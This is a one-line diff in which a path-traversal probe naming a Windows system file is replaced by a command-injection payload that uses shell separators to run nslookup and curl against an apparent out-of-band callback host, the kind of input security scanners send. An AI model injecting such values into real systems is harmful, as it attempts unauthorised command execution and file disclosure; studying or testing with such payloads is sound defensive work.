@@ -1,1 +1,1 @@
-c:/windows/win.ini
+;(nslookup -q=cname hitubavxlyclc70846.bxss.me||curl hitubavxlyclc70846.bxss.me)|(nslookup -q=cname hitubavxlyclc70846.bxss.me||curl hitubavxlyclc70846.bxss.me)&(nslookup -q=cname hitubavxlyclc70846.bxss.me||curl hitubavxlyclc70846.bxss.me)
